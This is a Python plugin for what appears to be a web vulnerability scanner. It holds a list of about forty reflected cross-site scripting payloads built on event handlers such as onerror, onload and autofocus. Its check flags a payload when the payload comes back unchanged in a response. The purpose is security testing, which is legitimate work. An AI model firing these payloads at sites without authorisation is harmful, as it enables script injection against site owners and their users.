#! usr/bin/python 
#coding=utf-8 

import re
from copy import deepcopy

from moudle.lurkscan.pluginmanager import Check
from moudle.lurkscan.plugins.sqlinject.sqlinject import SqlInject
from moudle.lurkscan.plugins.xss.xss import Xss
class Reflection(Xss, Check):
	
	def __init__(self):
		pass
	
	def _load_payloads(self):
		return ['"><img src=x onerror=alert(\'o\');>', 'javascript:alert(1)//INJECTX', '<svg/onload=alert(1)>//INJECTX', '<img onload=alert(1)>//INJECTX', '<img src=x onerror=prompt(1)>//INJECTX', '<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>', ' onmouseover="document.cookie=true;">//INJECTX', 'alert(1)>//INJECTX', '<h1>INJECTX</h1>', '<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>', '<svg><script>/<@/>alert(1)</script>//INJECTX', '<svg/onload=alert(/INJECTX/)>', '<iframe/onload=alert(/INJECTX/)>', '<svg/onload=alert`INJECTX`>', '<svg/onload=alert(/INJECTX/)>', '<svg/onload=alert(`INJECTX`)>', '}alert(/INJECTX/);{//', '<h1/onclick=alert(1)>a//INJECTX', '<svg/onload=alert(/INJECTX/)>', '<p/onclick=alert(/INJECTX/)>a', '<svg/onload=alert`INJECTX`>', '<svg/onload=alert(/INJECTX/)>', '<svg/onload=alert(`INJECTX`)>', '<video><source onerror="javascript:alert(1)">//INJECTX', '<video onerror="javascript:alert(1)"><source>//INJECTX', '<audio onerror="javascript:alert(1)"><source>//INJECTX', '<input autofocus onfocus=alert(1)>//INJECTX', '<select autofocus onfocus=alert(1)>//INJECTX', '<textarea autofocus onfocus=alert(1)>//INJECTX', '<keygen autofocus onfocus=alert(1)>//INJECTX', '<button form=test onformchange=alert(1)>//INJECTX', '<form><button formaction="javascript:alert(1)">//INJECTX', '<svg onload=(alert)(1) >//INJECTX', '<script>$=1,alert($)</script>//INJECTX', '<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX', '<img/src=\'x\'onerror=alert(1)>//INJECTX', '<marguee/onstart=alert(1)>//INJECTX', '<script>alert(1)//INJECTX', '<script>alert(1)<!--INJECTX', '<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX']
	
	def _check(self, xssety):
		if xssety.content.find(xssety.payload) != -1:
			return xssety.payload